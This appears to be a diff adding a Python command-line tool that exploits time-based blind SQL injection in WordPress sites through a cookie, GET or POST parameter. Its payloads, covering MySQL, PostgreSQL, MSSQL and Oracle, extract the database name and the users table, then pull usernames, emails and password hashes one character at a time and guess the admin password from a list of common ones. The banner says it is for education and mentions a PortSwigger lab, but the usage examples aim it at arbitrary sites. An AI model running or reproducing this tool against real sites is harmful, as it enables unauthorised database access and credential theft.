@@ -1,0 +1,391 @@
+import requests
+import time
+import string
+import sys
+from urllib.parse import quote
+import argparse
+
+class WordPressBlindSQLi:
+    def __init__(self, target_url, time_delay=5, timeout_threshold=3):
+        self.target_url = target_url.rstrip('/')
+        self.time_delay = time_delay
+        self.timeout_threshold = timeout_threshold
+        self.session = requests.Session()
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        })
+        
+    def test_sqli_vulnerability(self, injection_point, param_name):
+        """Test if the parameter is vulnerable to SQL injection"""
+        print(f"\n[*] Testing {injection_point} for SQL injection vulnerability...")
+        
+        # Test basic time-based injection
+        payloads = [
+            f"1' AND SLEEP({self.time_delay})--",
+            f"1' AND (SELECT SLEEP({self.time_delay}))--",
+            f"1' OR SLEEP({self.time_delay})--",
+            f"1)) AND SLEEP({self.time_delay})--",
+            f"1' AND IF(1=1,SLEEP({self.time_delay}),0)--",
+        ]
+        
+        for payload in payloads:
+            print(f"[*] Testing payload: {payload[:50]}...")
+            elapsed = self._send_payload(injection_point, param_name, payload)
+            
+            if elapsed >= self.timeout_threshold:
+                print(f"[+] VULNERABLE! Detected with payload: {payload}")
+                print(f"[+] Response time: {elapsed:.2f}s")
+                return True
+        
+        print("[-] Not vulnerable or injection point incorrect")
+        return False
+    
+    def _send_payload(self, injection_point, param_name, payload):
+        """Send payload and measure response time"""
+        start_time = time.time()
+        
+        try:
+            if injection_point == "cookie":
+                cookies = {param_name: payload}
+                response = self.session.get(self.target_url, cookies=cookies, timeout=self.time_delay + 10)
+            elif injection_point == "get":
+                params = {param_name: payload}
+                response = self.session.get(self.target_url, params=params, timeout=self.time_delay + 10)
+            elif injection_point == "post":
+                data = {param_name: payload}
+                response = self.session.post(self.target_url, data=data, timeout=self.time_delay + 10)
+            
+            elapsed_time = time.time() - start_time
+            return elapsed_time
+            
+        except requests.Timeout:
+            return self.time_delay + 1
+        except Exception as e:
+            print(f"[!] Error: {e}")
+            return 0
+    
+    def detect_database_type(self, injection_point, param_name):
+        """Detect the database type"""
+        print("\n[*] Detecting database type...")
+        
+        db_tests = {
+            'MySQL': f"1' AND SLEEP({self.time_delay})--",
+            'PostgreSQL': f"1'; SELECT pg_sleep({self.time_delay})--",
+            'MSSQL': f"1'; WAITFOR DELAY '00:00:0{self.time_delay}'--",
+            'Oracle': f"1' AND DBMS_LOCK.SLEEP({self.time_delay})=1--"
+        }
+        
+        for db_type, payload in db_tests.items():
+            print(f"[*] Testing {db_type}...", end=' ')
+            elapsed = self._send_payload(injection_point, param_name, payload)
+            
+            if elapsed >= self.timeout_threshold:
+                print(f"DETECTED! ({elapsed:.2f}s)")
+                return db_type
+            else:
+                print(f"No ({elapsed:.2f}s)")
+        
+        return "MySQL"  # Default for WordPress
+    
+    def get_database_name(self, injection_point, param_name):
+        """Extract database name"""
+        print("\n[*] Extracting database name...")
+        db_name = ""
+        position = 1
+        
+        while True:
+            found_char = False
+            for char in string.ascii_lowercase + string.digits + '_-':
+                payload = f"1' AND IF(SUBSTRING(DATABASE(),{position},1)='{char}',SLEEP({self.time_delay}),0)--"
+                elapsed = self._send_payload(injection_point, param_name, payload)
+                
+                if elapsed >= self.timeout_threshold:
+                    db_name += char
+                    print(f"[+] Database name: {db_name}")
+                    found_char = True
+                    break
+            
+            if not found_char:
+                break
+            position += 1
+            
+            if position > 50:  # Safety limit
+                break
+        
+        return db_name
+    
+    def find_wordpress_tables(self, injection_point, param_name, db_name):
+        """Find WordPress tables (users table)"""
+        print("\n[*] Searching for WordPress users table...")
+        
+        # Common WordPress table prefixes
+        prefixes = ['wp_', 'wordpress_', 'wp1_', 'wp2_', 'blog_', '']
+        
+        for prefix in prefixes:
+            table_name = f"{prefix}users"
+            payload = f"1' AND IF((SELECT COUNT(*) FROM {table_name})>0,SLEEP({self.time_delay}),0)--"
+            
+            print(f"[*] Testing table: {table_name}...", end=' ')
+            elapsed = self._send_payload(injection_point, param_name, payload)
+            
+            if elapsed >= self.timeout_threshold:
+                print(f"FOUND! ({elapsed:.2f}s)")
+                return table_name
+            else:
+                print(f"Not found ({elapsed:.2f}s)")
+        
+        return "wp_users"  # Default
+    
+    def get_users_count(self, injection_point, param_name, table_name):
+        """Get number of users"""
+        print(f"\n[*] Counting users in {table_name}...")
+        
+        for count in range(1, 20):
+            payload = f"1' AND IF((SELECT COUNT(*) FROM {table_name})={count},SLEEP({self.time_delay}),0)--"
+            elapsed = self._send_payload(injection_point, param_name, payload)
+            
+            if elapsed >= self.timeout_threshold:
+                print(f"[+] Found {count} users")
+                return count
+        
+        return 1
+    
+    def extract_username(self, injection_point, param_name, table_name, user_index=1):
+        """Extract username from users table"""
+        print(f"\n[*] Extracting username for user #{user_index}...")
+        username = ""
+        position = 1
+        
+        while True:
+            found_char = False
+            charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + '_-@.'
+            
+            for char in charset:
+                # Escape single quote
+                escaped_char = char.replace("'", "\\'")
+                payload = f"1' AND IF(SUBSTRING((SELECT user_login FROM {table_name} LIMIT {user_index-1},1),{position},1)='{escaped_char}',SLEEP({self.time_delay}),0)--"
+                
+                print(f"\r[*] Testing position {position}: {username}{char}", end='', flush=True)
+                elapsed = self._send_payload(injection_point, param_name, payload)
+                
+                if elapsed >= self.timeout_threshold:
+                    username += char
+                    print(f"\r[+] Username: {username}" + " " * 20)
+                    found_char = True
+                    break
+            
+            if not found_char:
+                break
+            position += 1
+            
+            if position > 50:  # Safety limit
+                break
+        
+        return username
+    
+    def extract_password_hash(self, injection_point, param_name, table_name, username):
+        """Extract password hash for given username"""
+        print(f"\n[*] Extracting password hash for user: {username}...")
+        password_hash = ""
+        position = 1
+        
+        while position <= 34:  # MD5 hash is 32 chars + $P$ prefix
+            found_char = False
+            charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + '$/.:'
+            
+            for char in charset:
+                escaped_char = char.replace("'", "\\'")
+                payload = f"1' AND IF(SUBSTRING((SELECT user_pass FROM {table_name} WHERE user_login='{username}'),{position},1)='{escaped_char}',SLEEP({self.time_delay}),0)--"
+                
+                print(f"\r[*] Testing position {position}: {password_hash}{char}", end='', flush=True)
+                elapsed = self._send_payload(injection_point, param_name, payload)
+                
+                if elapsed >= self.timeout_threshold:
+                    password_hash += char
+                    print(f"\r[+] Hash: {password_hash}" + " " * 20)
+                    found_char = True
+                    break
+            
+            if not found_char:
+                break
+            position += 1
+        
+        return password_hash
+    
+    def extract_email(self, injection_point, param_name, table_name, username):
+        """Extract email for given username"""
+        print(f"\n[*] Extracting email for user: {username}...")
+        email = ""
+        position = 1
+        
+        while True:
+            found_char = False
+            charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + '@._-'
+            
+            for char in charset:
+                escaped_char = char.replace("'", "\\'")
+                payload = f"1' AND IF(SUBSTRING((SELECT user_email FROM {table_name} WHERE user_login='{username}'),{position},1)='{escaped_char}',SLEEP({self.time_delay}),0)--"
+                
+                print(f"\r[*] Testing position {position}: {email}{char}", end='', flush=True)
+                elapsed = self._send_payload(injection_point, param_name, payload)
+                
+                if elapsed >= self.timeout_threshold:
+                    email += char
+                    print(f"\r[+] Email: {email}" + " " * 20)
+                    found_char = True
+                    break
+            
+            if not found_char:
+                break
+            position += 1
+            
+            if position > 100:  # Safety limit
+                break
+        
+        return email
+    
+    def brute_force_password(self, injection_point, param_name, table_name, username):
+        """Try to brute force short passwords (for testing only)"""
+        print(f"\n[*] Attempting to brute force password for: {username}")
+        print("[!] This only works for short/simple passwords in lab environments")
+        
+        common_passwords = [
+            'admin', 'password', 'Password1', 'admin123', '123456', 
+            'password123', 'admin@123', 'test', 'test123', 'wordpress',
+            'wp-admin', 'root', 'toor', 'pass', 'Pass123'
+        ]
+        
+        for pwd in common_passwords:
+            # Check if password hash matches when compared with MD5
+            payload = f"1' AND IF((SELECT user_pass FROM {table_name} WHERE user_login='{username}' AND user_pass=MD5('{pwd}'))!='',SLEEP({self.time_delay}),0)--"
+            
+            print(f"[*] Testing password: {pwd}...", end=' ')
+            elapsed = self._send_payload(injection_point, param_name, payload)
+            
+            if elapsed >= self.timeout_threshold:
+                print(f"FOUND! ({elapsed:.2f}s)")
+                return pwd
+            else:
+                print("No")
+        
+        return None
+    
+    def full_exploitation(self, injection_point, param_name):
+        """Perform full exploitation"""
+        print("\n" + "="*70)
+        print("WordPress Blind SQL Injection - Full Exploitation")
+        print("="*70)
+        
+        # Step 1: Verify vulnerability
+        if not self.test_sqli_vulnerability(injection_point, param_name):
+            print("\n[-] Target doesn't appear to be vulnerable")
+            return
+        
+        # Step 2: Detect database
+        db_type = self.detect_database_type(injection_point, param_name)
+        print(f"\n[+] Database Type: {db_type}")
+        
+        # Step 3: Get database name
+        db_name = self.get_database_name(injection_point, param_name)
+        print(f"[+] Database Name: {db_name}")
+        
+        # Step 4: Find users table
+        table_name = self.find_wordpress_tables(injection_point, param_name, db_name)
+        print(f"[+] Users Table: {table_name}")
+        
+        # Step 5: Get users count
+        users_count = self.get_users_count(injection_point, param_name, table_name)
+        
+        # Step 6: Extract user information
+        users_data = []
+        for i in range(1, min(users_count + 1, 4)):  # Limit to first 3 users
+            print(f"\n{'='*70}")
+            print(f"Extracting User #{i}")
+            print(f"{'='*70}")
+            
+            username = self.extract_username(injection_point, param_name, table_name, i)
+            if username:
+                email = self.extract_email(injection_point, param_name, table_name, username)
+                password_hash = self.extract_password_hash(injection_point, param_name, table_name, username)
+                
+                user_info = {
+                    'username': username,
+                    'email': email,
+                    'password_hash': password_hash
+                }
+                users_data.append(user_info)
+        
+        # Step 7: Display results
+        print("\n" + "="*70)
+        print("EXPLOITATION RESULTS")
+        print("="*70)
+        print(f"Target: {self.target_url}")
+        print(f"Database: {db_name}")
+        print(f"Users Table: {table_name}")
+        print(f"Total Users: {users_count}")
+        print("\nExtracted User Data:")
+        print("-"*70)
+        
+        for idx, user in enumerate(users_data, 1):
+            print(f"\nUser #{idx}:")
+            print(f"  Username: {user['username']}")
+            print(f"  Email: {user['email']}")
+            print(f"  Password Hash: {user['password_hash']}")
+        
+        # Step 8: Try to crack passwords (for admin user)
+        if users_data:
+            admin_user = users_data[0]['username']
+            print(f"\n[*] Attempting password brute force for '{admin_user}'...")
+            password = self.brute_force_password(injection_point, param_name, table_name, admin_user)
+            if password:
+                print(f"\n[+] PASSWORD FOUND: {password}")
+                print(f"[+] Login Credentials: {admin_user}:{password}")
+        
+        return users_data
+
+
+def main():
+    parser = argparse.ArgumentParser(description='WordPress Blind SQL Injection Exploit')
+    parser.add_argument('-u', '--url', required=True, help='Target URL')
+    parser.add_argument('-p', '--param', required=True, help='Vulnerable parameter name')
+    parser.add_argument('-t', '--type', choices=['get', 'post', 'cookie'], default='cookie', 
+                        help='Injection point type (default: cookie)')
+    parser.add_argument('-d', '--delay', type=int, default=5, help='Sleep delay in seconds (default: 5)')
+    parser.add_argument('--threshold', type=int, default=3, help='Time threshold in seconds (default: 3)')
+    parser.add_argument('--quick-test', action='store_true', help='Only test for vulnerability')
+    
+    args = parser.parse_args()
+    
+    print("""
+    ╔═══════════════════════════════════════════════════════════╗
+    ║   WordPress Blind SQL Injection Exploitation Tool        ║
+    ║   For Educational Purposes Only                           ║
+    ╚═══════════════════════════════════════════════════════════╝
+    """)
+    
+    exploiter = WordPressBlindSQLi(
+        target_url=args.url,
+        time_delay=args.delay,
+        timeout_threshold=args.threshold
+    )
+    
+    if args.quick_test:
+        exploiter.test_sqli_vulnerability(args.type, args.param)
+    else:
+        exploiter.full_exploitation(args.type, args.param)
+
+
+if __name__ == "__main__":
+    # Example usage for the lab
+    if len(sys.argv) == 1:
+        print("Example usage:")
+        print("\n# For the PortSwigger lab:")
+        print("python wordpress_sqli.py -u 'https://LAB-ID.web-security-academy.net' -p 'TrackingId' -t cookie")
+        print("\n# For WordPress site:")
+        print("python wordpress_sqli.py -u 'http://target.com/wordpress' -p 'id' -t get")
+        print("\n# Quick vulnerability test:")
+        print("python wordpress_sqli.py -u 'http://target.com' -p 'TrackingId' -t cookie --quick-test")
+        print("\n# Custom delay:")
+        print("python wordpress_sqli.py -u 'http://target.com' -p 'id' -t get -d 10 --threshold 7")
+    else:
+        main()
